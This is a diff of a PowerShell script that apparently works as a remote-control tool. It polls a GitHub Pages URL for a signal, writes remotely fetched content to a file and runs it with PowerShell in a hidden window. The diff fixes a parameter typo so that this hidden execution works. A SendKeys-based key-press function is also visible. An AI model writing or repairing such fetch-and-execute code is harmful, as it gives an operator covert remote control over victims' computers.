@@ -20,7 +20,7 @@ function Press-Key {<br>
     $vol.SendKeys([char]$ASCIInumber)<br>
 }<br>
 <br>
-}<br>
+<br>
 function Replace-String {<br>
     param ($Str, $Repstr, $Repstrwith)<br>
     return $Str.Replace($Repstr, $Repstrwith)<br>
@@ -160,7 +160,7 @@ $contents = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmot
 $signal = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmote-Signal/" #in progress<br>
 if ($signal -eq "True") {<br>
 Set-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -Value $contents<br>
-Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArguementList "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -WindowStyle Hidden<br>
+Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -WindowStyle Hidden<br>
 }<br>
 }<br>
 </p>
